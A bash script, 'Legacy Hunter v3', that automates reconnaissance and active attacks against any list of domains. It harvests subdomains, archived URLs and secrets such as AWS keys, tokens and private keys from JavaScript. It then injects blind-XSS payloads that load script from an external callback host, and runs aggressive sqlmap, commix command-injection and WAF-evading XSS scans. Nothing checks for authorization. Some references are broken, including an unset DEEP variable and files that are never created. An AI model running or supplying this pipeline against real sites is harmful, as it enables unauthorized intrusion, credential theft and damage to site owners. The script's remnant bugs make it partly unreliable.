#!/usr/bin/env bash
# ============================================================
#  Legacy Hunter v3 — Full Arsenal (Amass, Nikto, SQLMap, Jaeles)
# ============================================================
set -u
IFS=$'\n\t'
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'
PURPLE='\033[0;35m'; CYAN='\033[0;36m'; NC='\033[0m'; BOLD='\033[1m'
hdr()  { echo -e "\n${PURPLE}${BOLD}═══ $1 ═══${NC}"; }
ok()   { echo -e "${GREEN}  [+]${NC} $1"; }
warn() { echo -e "${YELLOW}  [!]${NC} $1"; }
err()  { echo -e "${RED}  [-]${NC} $1"; }
cnt()  { wc -l < "$1" 2>/dev/null | tr -d ' ' || echo 0; }

setup_templates() {
    mkdir -p scripts/nuclei-templates
    cat << 'YAML_EOF' > scripts/nuclei-templates/legacy-backup-exposure.yaml
id: legacy-backup-exposure
info:
  name: Legacy Backup File Exposure
  severity: high
  tags: exposure,backup
requests:
  - method: GET
    path: ["{{BaseURL}}/.env", "{{BaseURL}}/.env.bak", "{{BaseURL}}/backup.zip", "{{BaseURL}}/.git/config"]
    matchers-condition: or
    matchers:
      - type: word
        words: ["DB_PASSWORD", "DB_USER", "mysql://", "AWS_ACCESS_KEY"]
YAML_EOF
    cat << 'YAML_EOF' > scripts/nuclei-templates/legacy-api-version.yaml
id: legacy-api-version
info:
  name: Legacy API Version Exposure
  severity: medium
requests:
  - method: GET
    path: ["{{BaseURL}}/api/v1/", "{{BaseURL}}/api/v0/", "{{BaseURL}}/swagger-ui.html"]
    matchers:
      - type: word
        words: ["swagger", "openapi", "apiVersion", "deprecated"]
YAML_EOF
    cat << 'YAML_EOF' > scripts/nuclei-templates/legacy-js-secrets.yaml
id: legacy-js-secrets
info:
  name: Legacy JS Secrets Exposure
  severity: high
requests:
  - method: GET
    path: ["{{BaseURL}}/js/app.js", "{{BaseURL}}/static/js/app.js"]
    matchers:
      - type: regex
        regex: ['AKIA[0-9A-Z]{16}', 'AIza[0-9A-Za-z_-]{35}', 'sk_live_[0-9a-zA-Z]{24,}']
YAML_EOF
    cat << 'YAML_EOF' > scripts/nuclei-templates/legacy-deprecated-headers.yaml
id: legacy-deprecated-headers
info:
  name: Deprecated Headers / Old Server Tech
  severity: info
requests:
  - method: GET
    path: ["{{BaseURL}}"]
    matchers:
      - type: regex
        regex: ["Server: Apache/2\\.[0-2]", "Server: nginx/1\\.[0-9]"]
        part: header
YAML_EOF
}

INPUT="${1:-domains.txt}"
[ ! -f "$INPUT" ] && { err "File not found: $INPUT"; exit 1; }
DOMAINS=()
while IFS= read -r line; do
    line=$(echo "$line" | tr -d '\r' | xargs)
    [[ -z "$line" || "$line" =~ ^# ]] && continue
    DOMAINS+=("$line")
done < "$INPUT"
[ ${#DOMAINS[@]} -eq 0 ] && { err "No domains"; exit 1; }

setup_templates

ROOT="legacy_hunt_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$ROOT"
MASTER_STATS="$ROOT/.stats.txt"
> "$MASTER_STATS"
export PATH="$PATH:$HOME/go/bin:${GOPATH:-$HOME/go}/bin:/usr/local/bin"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
CUSTOM_NUCLEI_DIR="$(pwd)/scripts/nuclei-templates"

send_slack() { [ -z "${SLACK_WEBHOOK_URL:-}" ] && return 0; curl -s -X POST "$SLACK_WEBHOOK_URL" -H 'Content-type: application/json' --data "{\"text\":\"$1\"}" >/dev/null 2>&1 || true; }
send_discord() { [ -z "${DISCORD_WEBHOOK_URL:-}" ] && return 0; local p; p=$(python3 -c "import json,sys; print(json.dumps({'content': sys.argv[1]}))" "$1" 2>/dev/null) || return 0; curl -s -X POST "$DISCORD_WEBHOOK_URL" -H 'Content-type: application/json' --data "$p" >/dev/null 2>&1 || true; }
notify() { send_slack "$1"; send_discord "$1"; echo -e "${CYAN}  [notify]${NC} $1"; }

create_github_issue() {
    local title="$1"; local body="$2"; local labels="${3:-security,automated}"
    [ -z "${GITHUB_TOKEN:-}" ] && return 0
    local payload; payload=$(python3 -c "import json, sys; print(json.dumps({'title': sys.argv[1], 'body': sys.argv[2], 'labels': sys.argv[3].split(',')}))" "$title" "$body" "$labels" 2>/dev/null) || return 0
    curl -s -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" -d "$payload" "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues" >/dev/null 2>&1 || true
}

process_domain() {
    local TARGET="$1"; local W="$2"
    TARGET=$(echo "$TARGET" | sed 's#^https\?://##' | sed 's#/.*$##' | sed 's/:.*$//')
    mkdir -p "$W"/{recon,vulns,nuclei,dalfox,sqlmap,commix,jaeles,legacy,js,backups,params,robots,blind_xss}
    echo ""; echo -e "${PURPLE}${BOLD}╔═══════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}${BOLD}║  TARGET: $TARGET${NC}"
    echo -e "${PURPLE}${BOLD}╚═══════════════════════════════════════════════════╝${NC}"
    local T0; T0=$(date +%s); notify "🕰️ Starting Legacy Hunt on *$TARGET*"

    hdr "PHASE 1/10 — Subdomain Enumeration (Amass + Subfinder)"
    (
        subfinder -d "$TARGET" -all -recursive -silent 2>/dev/null
        assetfinder --subs-only "$TARGET" 2>/dev/null
        curl -s --max-time 20 "https://crt.sh/?q=%25.$TARGET&output=json" 2>/dev/null | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g'
        amass enum -passive -d "$TARGET" -silent 2>/dev/null
        if [ "$DEEP" = true ]; then amass enum -active -d "$TARGET" -brute -min-for-recursive 3 -silent 2>/dev/null; fi
    ) | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]' | grep -E "\.$TARGET$|^$TARGET$" | sort -u > "$W/recon/subdomains.txt"
    ok "Subdomains: $(cnt "$W/recon/subdomains.txt")"

    hdr "PHASE 2/10 — Live Host Detection"
    httpx -l "$W/recon/subdomains.txt" -silent -title -tech-detect -status-code -ip -cname -web-server -location -random-agent -t 150 -timeout 10 -retries 2 -follow-redirects -o "$W/recon/httpx_full.txt" 2>/dev/null || true
    awk '{print $1}' "$W/recon/httpx_full.txt" 2>/dev/null | grep -E '^https?://' | sort -u > "$W/recon/live.txt"
    if [ ! -s "$W/recon/live.txt" ]; then warn "No live hosts"; echo "https://$TARGET" > "$W/recon/live.txt"; fi
    ok "Live hosts: $(cnt "$W/recon/live.txt")"

    hdr "PHASE 3/10 — Historical Robots.txt & Sensitive Files"
    if command -v robofinder >/dev/null 2>&1; then timeout 180 robofinder -u "$TARGET" -o "$W/robots/robots_history.txt" 2>/dev/null || true; fi
    ROBOTS_CNT=$(cnt "$W/robots/robots_history.txt")
    grep -Ei '^(Disallow|Allow):' "$W/robots/robots_history.txt" 2>/dev/null | awk '{print $2}' | grep -v '^$' | sort -u > "$W/robots/robots_paths.txt" 2>/dev/null || true
    ok "Robots.txt paths: $ROBOTS_CNT"

    hdr "PHASE 4/10 — Historical URL Mining"
    (
        gau "$TARGET" --threads 30 --timeout 20 --subs 2>/dev/null
        echo "$TARGET" | waybackurls 2>/dev/null
        if command -v waymore >/dev/null 2>&1; then waymore -i "$TARGET" -mode U -oU "$W/legacy/waymore_urls.txt" 2>/dev/null || true; fi
    ) | grep -E '^https?://' | grep -v '^$' | sort -u > "$W/legacy/historical_urls.txt"
    ok "Historical URLs: $(cnt "$W/legacy/historical_urls.txt")"
    grep -Ei '\.(bak|old|backup|zip|tar|gz|rar|7z|sql|db|sqlite|env|config|yml|yaml|json|xml|log|txt|md|swp|swo|orig|save|cache|DS_Store)$' "$W/legacy/historical_urls.txt" > "$W/backups/sensitive_files.txt" 2>/dev/null || true
    ok "Sensitive/backup files: $(cnt "$W/backups/sensitive_files.txt")"

    hdr "PHASE 5/10 — Crawling & Parameter Fuzzing"
    katana -list "$W/recon/live.txt" -d 5 -jc -kf all -fx -xhr -aff -random-agent -silent -timeout 15 -c 50 -p 20 -o "$W/legacy/katana_urls.txt" 2>/dev/null || true
    cat "$W/legacy/historical_urls.txt" "$W/legacy/katana_urls.txt" 2>/dev/null | sort -u > "$W/legacy/all_urls.txt"
    grep '=' "$W/legacy/all_urls.txt" 2>/dev/null | sort -u > "$W/params/urls_with_params.txt"
    ok "URLs with params: $(cnt "$W/params/urls_with_params.txt")"
    if command -v paramspider >/dev/null 2>&1; then python3 -m paramspider -d "$TARGET" -o "$W/params/paramspider.txt" 2>/dev/null || true; fi
    if command -v arjun >/dev/null 2>&1; then head -20 "$W/recon/live.txt" | arjun -i - -oT "$W/params/arjun.txt" -m GET,POST -t 10 --stable 2>/dev/null || true; fi

    hdr "PHASE 6/10 — JS Analysis"
    grep -E '\.js(\?|$)' "$W/legacy/all_urls.txt" 2>/dev/null | sed 's/?.*$//' | sort -u > "$W/js/js_urls.txt"
    (cat "$W/recon/live.txt" | subjs 2>/dev/null; cat "$W/recon/live.txt" | getJS --complete 2>/dev/null) | grep -E '\.js(\?|$)' | sed 's/?.*$//' | sort -u >> "$W/js/js_urls.txt" 2>/dev/null || true
    sort -u "$W/js/js_urls.txt" -o "$W/js/js_urls.txt"; ok "JS URLs: $(cnt "$W/js/js_urls.txt")"
    if [ -s "$W/js/js_urls.txt" ]; then
        mkdir -p "$W/js/files"
        head -200 "$W/js/js_urls.txt" | xargs -P 15 -I{} bash -c 'url="{}"; f=$(echo "$url" | md5sum | cut -c1-16); curl -s --max-time 12 -A "'"$UA"'" "$url" -o "'"$W/js/files"'/$f.js" 2>/dev/null' 2>/dev/null || true
        find "$W/js/files" -name "*.js" -size +100c 2>/dev/null | while read f; do jsluice urls "$f" 2>/dev/null; done | jq -r 'select(.url) | .url' 2>/dev/null | sort -u > "$W/js/js_endpoints.txt" 2>/dev/null || true
        ok "JS endpoints: $(cnt "$W/js/js_endpoints.txt")"
        cat "$W/js/files"/*.js 2>/dev/null | grep -Eo 'AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|sk_live_[0-9a-zA-Z]{24,}|ghp_[a-zA-Z0-9]{36}|eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+|-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----' | sort -u > "$W/js/js_secrets.txt" 2>/dev/null || true
        ok "Secrets in JS: $(cnt "$W/js/js_secrets.txt")"
    fi

    hdr "PHASE 7/10 — Blind XSS (interactsh)"
    BLIND_CNT=0
    if command -v interactsh-client >/dev/null 2>&1; then
        interactsh-client -o "$W/blind_xss/interactions.txt" -json > "$W/blind_xss/interactsh.log" 2>&1 &
        INTERACT_PID=$!; sleep 8
        CALLBACK=$(grep -oE '[a-z0-9]+\.[a-z0-9]+\.oast\.[a-z]+' "$W/blind_xss/interactsh.log" 2>/dev/null | head -1)
        if [ -n "$CALLBACK" ]; then
            echo "<script src=\"https://$CALLBACK\"></script>" > "$W/blind_xss/payload.txt"
            grep '=' "$W/legacy/all_urls.txt" 2>/dev/null | head -50 > "$W/blind_xss/inject.txt" 2>/dev/null || true
            if [ -s "$W/blind_xss/inject.txt" ]; then
                while IFS= read -r url; do
                    test_url=$(echo "$url" | sed "s/=[^&]*/=<script src=\"https:\/\/$CALLBACK\"><\/script>/g")
                    curl -s --max-time 10 -A "$UA" "$test_url" -o /dev/null 2>/dev/null || true
                done < "$W/blind_xss/inject.txt"
                sleep 45; kill $INTERACT_PID 2>/dev/null || true
                if [ -s "$W/blind_xss/interactions.txt" ]; then BLIND_CNT=$(grep -c 'interaction' "$W/blind_xss/interactions.txt" 2>/dev/null || echo 0); fi
            fi
        fi
    fi
    ok "Blind XSS: $BLIND_CNT"

    hdr "PHASE 8/10 — Nuclei Scans (Custom + Full Power)"
    if [ -d "$CUSTOM_NUCLEI_DIR" ]; then nuclei -l "$W/recon/live.txt" -t "$CUSTOM_NUCLEI_DIR" -severity critical,high,medium -rl 100 -c 40 -timeout 10 -random-agent -silent -o "$W/nuclei/custom.txt" 2>/dev/null || true; fi
    nuclei -l "$W/recon/live.txt" -severity critical,high,medium -t http/cves/ -t http/vulnerabilities/ -t http/exposures/ -t http/misconfiguration/ -t http/default-logins/ -t http/takeovers/ -rl 150 -c 60 -bs 60 -timeout 10 -silent -o "$W/nuclei/all_findings.txt" 2>/dev/null || true
    NUCLEI_CNT=$(grep -cE '^\[' "$W/nuclei/all_findings.txt" 2>/dev/null || echo 0)
    ok "Nuclei findings: $NUCLEI_CNT"
    if [ "$NUCLEI_CNT" -gt 0 ]; then
        CRITICAL_LINES=$(grep -iE '\[critical\]|\[high\]' "$W/nuclei/all_findings.txt" 2>/dev/null | head -5)
        if [ -n "$CRITICAL_LINES" ]; then notify "🔴 *Nuclei Critical/High* on $TARGET — $NUCLEI_CNT total"; create_github_issue "🔴 Nuclei Critical/High Findings — $TARGET" "## Nuclei Findings\n\n**Target:** $TARGET\n**Total:** $NUCLEI_CNT\n\n### Critical/High\n\`\`\`\n$CRITICAL_LINES\n\`\`\`" "security,nuclei,automated"; fi
    fi

    hdr "PHASE 9/10 — Active Vulnerability Scanners (Dalfox, SQLMap, Commix, Nikto, Jaeles)"
    grep '=' "$W/legacy/all_urls.txt" 2>/dev/null | head -200 > "$W/dalfox/targets.txt" 2>/dev/null || true
    DALFOX_CNT=0
    if [ -s "$W/dalfox/targets.txt" ]; then
        dalfox file "$W/dalfox/targets.txt" --deep-domxss --mining-dom --mining-dict --waf-evasion --skip-bav --worker 100 --delay 0 --timeout 15 --retry 2 --output-all --no-color -o "$W/dalfox/findings.txt" --silence 2>/dev/null || true
        DALFOX_CNT=$(grep -ciE '\[V\]|POC|VULN' "$W/dalfox/findings.txt" 2>/dev/null || echo 0)
    fi
    ok "Dalfox XSS: $DALFOX_CNT"
    if [ "$DALFOX_CNT" -gt 0 ]; then notify "🟡 *Dalfox XSS* on $TARGET — $DALFOX_CNT findings"; create_github_issue "🟡 XSS Findings (Dalfox) — $TARGET" "## XSS Findings\n\n**Target:** $TARGET\n**Findings:** $DALFOX_CNT\n\n\`\`\`\n$(grep -iE '\[V\]|POC' "$W/dalfox/findings.txt" | head -20)\n\`\`\`" "security,xss,automated"; fi

    head -30 "$W/params/urls_with_params.txt" > "$W/sqlmap/targets.txt" 2>/dev/null || true
    SQLMAP_CNT=0
    if [ -s "$W/sqlmap/targets.txt" ] && command -v sqlmap >/dev/null 2>&1; then
        while IFS= read -r url; do
            [ -z "$url" ] && continue
            sqlmap -u "$url" --batch --random-agent --level=5 --risk=3 --threads=10 --timeout=15 --retries=1 --technique=BEUSTQ --smart --output-dir="$W/sqlmap/" --flush-session 2>/dev/null | grep -iE 'parameter|injectable|vulnerable|Type:|Title:' >> "$W/sqlmap/findings.txt" 2>/dev/null || true
        done < "$W/sqlmap/targets.txt"
        SQLMAP_CNT=$(grep -ci 'injectable' "$W/sqlmap/findings.txt" 2>/dev/null || echo 0)
    fi
    ok "SQLMap SQLi: $SQLMAP_CNT"
    if [ "$SQLMAP_CNT" -gt 0 ]; then notify "🔵 *SQL Injection* on $TARGET — $SQLMAP_CNT"; create_github_issue "🔵 SQL Injection (SQLMap) — $TARGET" "## SQL Injection Confirmed\n\n**Target:** $TARGET\n\n\`\`\`\n$(cat "$W/sqlmap/findings.txt")\n\`\`\`" "security,sqli,automated,critical"; fi

    head -20 "$W/params/urls_with_params.txt" > "$W/commix/targets.txt" 2>/dev/null || true
    COMMIX_CNT=0
    if [ -s "$W/commix/targets.txt" ] && [ -f /opt/commix/commix.py ]; then
        while IFS= read -r url; do
            [ -z "$url" ] && continue
            timeout 90 python3 /opt/commix/commix.py -u "$url" --batch --random-agent --level=3 --output-dir="$W/commix/" 2>/dev/null | grep -iE 'vulnerable|injectable|exploitable' >> "$W/commix/findings.txt" 2>/dev/null || true
        done < "$W/commix/targets.txt"
        COMMIX_CNT=$(grep -ci 'vulnerable' "$W/commix/findings.txt" 2>/dev/null || echo 0)
    fi
    ok "Commix RCE: $COMMIX_CNT"
    if [ "$COMMIX_CNT" -gt 0 ]; then notify "🟣 *Command Injection* on $TARGET — $COMMIX_CNT"; create_github_issue "🟣 Command Injection (Commix) — $TARGET" "## Command Injection Confirmed\n\n**Target:** $TARGET\n\n\`\`\`\n$(cat "$W/commix/findings.txt")\n\`\`\`" "security,rce,automated,critical"; fi

    head -10 "$W/recon/live.txt" > "$W/vulns/nikto_targets.txt" 2>/dev/null || true
    while IFS= read -r url; do
        [ -z "$url" ] && continue
        timeout 120 nikto -h "$url" -maxtime 90 -nointeractive -Tuning 123bde -o "$W/vulns/nikto.txt" 2>/dev/null || true
    done < "$W/vulns/nikto_targets.txt"
    NIKTO_CNT=$(grep -cE '^\+ ' "$W/vulns/nikto.txt" 2>/dev/null || echo 0)
    ok "Nikto findings: $NIKTO_CNT"

    JAELES_CNT=0
    if [ -s "$W/recon/live.txt" ] && command -v jaeles >/dev/null 2>&1; then
        jaeles scan -s "cves" -s "common" -s "sensitive" -U "$W/recon/live.txt" -o "$W/jaeles/findings.txt" 2>/dev/null || true
        JAELES_CNT=$(grep -c "Vulnerable" "$W/jaeles/findings.txt" 2>/dev/null || echo 0)
    fi
    ok "Jaeles findings: $JAELES_CNT"

    hdr "PHASE 10/10 — Report Generation"
    local T1; T1=$(date +%s); local DUR=$(( (T1-T0) / 60 ))
    {
        echo "# Legacy Hunter v3 Report — $TARGET"
        echo "Duration: ${DUR}m"
        echo "| Scanner | Findings |"
        echo "|---------|----------|"
        echo "| Nuclei | $NUCLEI_CNT |"
        echo "| Dalfox XSS | $DALFOX_CNT |"
        echo "| SQLMap | $SQLMAP_CNT |"
        echo "| Commix | $COMMIX_CNT |"
        echo "| Nikto | $NIKTO_CNT |"
        echo "| Jaeles | $JAELES_CNT |"
        echo "| Blind XSS | $BLIND_CNT |"
        echo "Historical URLs: $(cnt "$W/legacy/historical_urls.txt")"
        echo "Backup Files: $(cnt "$W/backups/sensitive_files.txt")"
        echo "Old Params: $(cnt "$W/params/old_params.txt")"
        echo "JS Secrets: $(cnt "$W/js/js_secrets.txt")"
    } > "$W/LEGACY_REPORT.md"
    
    echo "$TARGET|$(cnt "$W/recon/subdomains.txt")|$(cnt "$W/recon/live.txt")|$(cnt "$W/legacy/historical_urls.txt")|$(cnt "$W/backups/sensitive_files.txt")|$(cnt "$W/params/old_params.txt")|$(cnt "$W/legacy/deprecated_endpoints.txt")|$(cnt "$W/js/js_endpoints.txt")|$(cnt "$W/js/js_secrets.txt")|$NUCLEI_CNT|$DALFOX_CNT|$SQLMAP_CNT|$COMMIX_CNT|$NIKTO_CNT|$JAELES_CNT|$BLIND_CNT|$DUR" >> "$MASTER_STATS"
    notify "✅ *$TARGET* done — Nuclei:$NUCLEI_CNT Dalfox:$DALFOX_CNT SQLMap:$SQLMAP_CNT Nikto:$NIKTO_CNT Jaeles:$JAELES_CNT"
}

for DOMAIN in "${DOMAINS[@]}"; do
    DOMAIN_CLEAN=$(echo "$DOMAIN" | sed 's#^https\?://##' | sed 's#/.*$##' | sed 's/:.*$//')
    W="$ROOT/$DOMAIN_CLEAN"
    process_domain "$DOMAIN_CLEAN" "$W"
done

{
    echo "# 🕰️ Legacy Hunter v3 — Master Report"
    echo "Domains: ${#DOMAINS[@]}"
    echo "| Domain | Subs | Live | URLs | Backups | Params | JS Endpoints | JS Secrets | Nuclei | Dalfox | SQLMap | Commix | Nikto | Jaeles | Blind | Time |"
    echo "|--------|------|------|------|---------|--------|--------------|------------|--------|--------|--------|--------|-------|--------|-------|------|"
    while IFS='|' read -r d subs live hist backup params dep js jssec nuclei dalfox sqlmap commix nikto jaeles blind time; do
        echo "| **$d** | $subs | $live | $hist | $backup | $params | $js | $jssec | $nuclei | $dalfox | $sqlmap | $commix | $nikto | $jaeles | $blind | ${time}m |"
    done < "$MASTER_STATS"
} > "$ROOT/MASTER_LEGACY_REPORT.md"

notify "🏁 *Legacy Hunter v3 finished* — ${#DOMAINS[@]} domains, total findings: $(awk -F'|' '{s+=$10+$11+$12+$13+$14+$15+$16} END {print s}' "$MASTER_STATS" 2>/dev/null || echo 0)"
echo -e "${GREEN}${BOLD}╔═══════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}${BOLD}║      LEGACY HUNTER v3 COMPLETED ✓                 ║${NC}"
echo -e "${GREEN}${BOLD}╚═══════════════════════════════════════════════════╝${NC}"
exit 0
